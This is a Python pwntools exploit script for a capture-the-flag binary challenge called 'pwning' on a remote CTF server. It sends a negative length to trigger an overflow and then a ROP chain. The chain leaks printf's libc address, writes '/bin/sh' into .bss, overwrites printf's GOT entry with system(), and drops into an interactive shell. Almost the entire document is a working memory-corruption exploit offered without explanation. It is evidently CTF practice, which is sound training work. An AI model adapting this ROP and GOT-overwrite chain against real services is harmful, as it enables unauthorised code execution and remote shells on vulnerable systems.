# wget https://ctf.j0n9hyun.xyz/files/a1cfa125d5bf7978de474ebc4e2a2b65/pwning
import code
import time
from pwn import *

p = remote('ctf.j0n9hyun.xyz',3019)
#p = process('./pwning')

#input('attach gdb')

e = ELF('./pwning')
printf_plt = e.plt['printf']
printf_got = e.got['printf']
get_n = e.sym['get_n']

print('[*] printf@plt ', hex(printf_plt))
print('[*] printf@got ', hex(printf_got))

bss = 0x0804a040
poppoppopret = 0x804835a
popret = poppoppopret+3

print(p.recv())
p.sendline('-1')
print(p.recv())

context.arch = 'i386'

payload = b""
payload += b"a"*0x2c
payload += b"b"*0x4
payload += p32(printf_plt)
payload += p32(popret)
payload += p32(printf_got)
payload += p32(get_n)	# write /bin/sh\x00
payload += p32(poppoppopret)
payload += p32(bss)	
payload += p32(0xffffffff)
payload += p32(0xffffffff)
payload += p32(get_n)	# write system_addr
payload += p32(poppoppopret)	
payload += p32(printf_got)
payload += p32(0xffffffff)
payload += p32(0xffffffff)
payload += p32(0x08048576)	# call printf
#payload += p32(popret)
payload += p32(bss)

p.sendline(payload)
time.sleep(0.2)
print(p.recvline())
printf_addr = unpack(p.recv(4), 'all', endian='little')
#system_addr = printf_addr-0x14150	# ubuntu 18.04
#system_addr = printf_addr-0xe8d0	# ubuntu 16.04
#system_addr = printf_addr-0xeb10	# ubuntu 20.04
system_addr = printf_addr-0xe6e0
print('[*] printf : ', hex(printf_addr))
print('[*] system : ', hex(system_addr))
p.sendline(b'/bin/sh')
time.sleep(0.2)
p.sendline(p32(system_addr))
time.sleep(0.2)
p.interactive()
